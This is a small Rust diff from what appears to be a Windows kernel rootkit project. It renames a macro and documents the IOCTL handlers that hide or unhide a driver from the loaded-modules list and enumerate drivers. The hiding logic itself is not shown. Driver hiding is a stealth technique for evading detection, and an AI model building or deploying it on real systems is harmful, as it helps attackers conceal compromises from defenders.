@@ -7,16 +7,25 @@ use {
         structs::{DriverInfo, TargetDriver}
     }, 
     crate::{
-        driver::Driver, handle_driver, utils::ioctls::IoctlHandler
+        driver::Driver, handle, utils::ioctls::IoctlHandler
     },
 };
 
+/// Registers the IOCTL handlers for driver-related operations.
+///
+/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
+/// their respective IOCTL codes. The two operations supported are:
+///
+/// # Parameters
+/// 
+/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the driver-related
+///   IOCTL handlers will be inserted.
+///
 pub fn get_driver_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
-
     // Hiding / Unhiding a driver from loaded modules.
     ioctls.insert(IOCTL_HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_HIDE_UNHIDE_DRIVER");
-        let status = unsafe { handle_driver!(stack, Driver::driver_toggle, TargetDriver) };
+        let status = unsafe { handle!(stack, Driver::driver_toggle, TargetDriver) };
         unsafe { (*irp).IoStatus.Information = 0 };
         status
     }) as IoctlHandler);
@@ -26,7 +35,7 @@ pub fn get_driver_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
         log::info!("Received IOCTL_ENUMERATE_DRIVER");
         
         let mut information = 0;
-        let status = unsafe { handle_driver!(irp, Driver::enumerate_driver, DriverInfo, &mut information) };
+        let status = unsafe { handle!(irp, Driver::enumerate_driver, DriverInfo, &mut information) };
         
         unsafe { (*irp).IoStatus.Information = information as u64 };
 
